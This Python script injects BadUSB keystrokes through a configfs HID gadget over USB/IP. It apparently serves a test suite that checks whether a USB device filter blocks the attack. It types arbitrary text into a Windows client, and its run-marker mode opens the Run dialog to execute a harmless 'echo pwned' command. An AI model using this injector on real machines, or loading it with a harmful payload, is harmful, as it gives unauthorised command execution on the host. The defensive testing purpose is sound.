#!/usr/bin/env python3
"""Live BadUSB keystroke injection over USB/IP via a configfs HID gadget.

Once a HID gadget is attached by the Windows client, writing 8-byte boot-keyboard
reports to /dev/hidgN delivers real keystrokes to that client. This is what makes
the HID simulation a *real* attack rather than just a device that enumerates.

Used by the efficacy tests (filter DISABLED) to prove the attack works. With the
filter ON the device never attaches, /dev/hidgN never opens, and nothing types.

Layout assumption: US QWERTY on the client. Timing/layout may need tuning.

Examples:
  hid_type.py --device /dev/hidg0 --text "hello world"
  hid_type.py --device /dev/hidg0 --run-marker deadbeef
      # opens Run (Win+R) and runs: cmd /c echo pwned>C:\\Users\\Public\\ub_<tok>.txt
"""

from __future__ import annotations

import argparse
import errno
import os
import time

# Writing to /dev/hidgN before the host has selected the configuration and
# enabled the interrupt-IN endpoint fails with ESHUTDOWN ("Cannot send after
# transport endpoint shutdown"); a busy gadget can also momentarily return
# EAGAIN. Both mean "not ready yet, retry", not a hard failure.
_NOT_READY_ERRNOS = frozenset({errno.ESHUTDOWN, errno.EAGAIN})

# Modifier bits (byte 0 of the boot-keyboard report).
MOD_LSHIFT = 0x02
MOD_LGUI = 0x08

# Special keys.
KEY_ENTER = 0x28
KEY_SPACE = 0x2C
KEY_R = 0x15


def _build_keymap() -> dict[str, tuple[int, bool]]:
    """Map a printable ASCII char -> (usage_code, needs_shift) for US layout."""
    m: dict[str, tuple[int, bool]] = {}

    for i, c in enumerate("abcdefghijklmnopqrstuvwxyz"):
        m[c] = (0x04 + i, False)
        m[c.upper()] = (0x04 + i, True)

    digits = "1234567890"
    for i, c in enumerate(digits):
        m[c] = (0x1E + i, False)
    for shifted, base in zip("!@#$%^&*()", digits):
        m[shifted] = (m[base][0], True)

    m[" "] = (KEY_SPACE, False)
    pairs = {
        "-": (0x2D, "_"), "=": (0x2E, "+"), "[": (0x2F, "{"), "]": (0x30, "}"),
        "\\": (0x31, "|"), ";": (0x33, ":"), "'": (0x34, '"'), "`": (0x35, "~"),
        ",": (0x36, "<"), ".": (0x37, ">"), "/": (0x38, "?"),
    }
    for base, (code, shifted) in pairs.items():
        m[base] = (code, False)
        m[shifted] = (code, True)
    return m


KEYMAP = _build_keymap()


def _report(modifier: int = 0, key: int = 0) -> bytes:
    return bytes([modifier, 0, key, 0, 0, 0, 0, 0])


class Keyboard:
    def __init__(self, device: str, char_delay: float = 0.01,
                 ready_timeout: float = 10.0):
        self.device = device
        self.char_delay = char_delay
        self.ready_timeout = ready_timeout

    def _write_reports(self, *reports: bytes) -> None:
        """Open the gadget and write the report(s), retrying while the host has
        not yet enabled the HID endpoint.

        After attach the USB *device* enumerates before the HID *interface* is
        live, so the first write can race the client selecting the configuration
        / loading its keyboard driver and fail with ESHUTDOWN. We retry until the
        endpoint accepts the write or ready_timeout elapses, then fail with an
        actionable message instead of a bare BrokenPipeError.
        """
        deadline = time.time() + self.ready_timeout
        while True:
            try:
                with open(self.device, "wb") as f:
                    for r in reports:
                        f.write(r)
                        f.flush()
                return
            except OSError as e:
                if e.errno not in _NOT_READY_ERRNOS:
                    raise
                if time.time() >= deadline:
                    raise RuntimeError(
                        f"HID endpoint {self.device} never became writable "
                        f"(errno {e.errno}: {os.strerror(e.errno)}) within "
                        f"{self.ready_timeout:g}s. The device attached but the "
                        f"client did not enable the HID interface -- it may still "
                        f"be loading the keyboard driver, or the gadget was "
                        f"detached. Increase --ready-timeout if the client is slow."
                    ) from e
                time.sleep(0.25)

    def wait_ready(self) -> None:
        """Block until the client has enabled the HID endpoint (or time out).

        Sends a single all-zero ("no keys pressed") report, which is a harmless
        readiness probe: it delivers no keystroke but exercises the same write
        path, so a successful probe means real keystrokes will land.
        """
        self._write_reports(_report())

    def _send(self, modifier: int, key: int) -> None:
        self._write_reports(_report(modifier, key), _report())  # press, release
        time.sleep(self.char_delay)

    def type_text(self, text: str) -> None:
        for ch in text:
            if ch == "\n":
                self._send(0, KEY_ENTER)
                continue
            entry = KEYMAP.get(ch)
            if entry is None:
                raise ValueError(f"unmapped character: {ch!r}")
            code, shift = entry
            self._send(MOD_LSHIFT if shift else 0, code)

    def press_enter(self) -> None:
        self._send(0, KEY_ENTER)

    def open_run_dialog(self) -> None:
        self._send(MOD_LGUI, KEY_R)


def run_marker(kb: Keyboard, token: str, settle: float = 1.5) -> str:
    """Open Run and drop a marker file readable by the WinRM oracle.

    Writes C:\\Users\\Public\\ub_<token>.txt (Public is world-writable, so the
    interactive session and the WinRM session agree on the path).
    """
    path = f"C:\\Users\\Public\\ub_{token}.txt"
    kb.wait_ready()  # let the client finish enabling the HID interface
    kb.open_run_dialog()
    time.sleep(settle)
    kb.type_text(f"cmd /c echo pwned>{path}")
    time.sleep(0.3)
    kb.press_enter()
    return path


def main() -> None:
    ap = argparse.ArgumentParser(description=__doc__)
    ap.add_argument("--device", default="/dev/hidg0")
    ap.add_argument("--text", help="type this literal text then Enter")
    ap.add_argument("--run-marker", metavar="TOKEN",
                    help="open Run and drop C:\\Users\\Public\\ub_<TOKEN>.txt")
    ap.add_argument("--char-delay", type=float, default=0.01)
    ap.add_argument("--ready-timeout", type=float, default=10.0,
                    help="seconds to wait for the client to enable the HID "
                         "endpoint before giving up (default: 10)")
    args = ap.parse_args()

    kb = Keyboard(args.device, char_delay=args.char_delay,
                  ready_timeout=args.ready_timeout)
    if args.run_marker:
        path = run_marker(kb, args.run_marker)
        print(f"fired run-marker -> {path}")
    elif args.text:
        kb.wait_ready()  # let the client finish enabling the HID interface
        kb.type_text(args.text)
        kb.press_enter()
        print(f"typed {len(args.text)} chars")
    else:
        ap.error("one of --text or --run-marker is required")


if __name__ == "__main__":
    main()
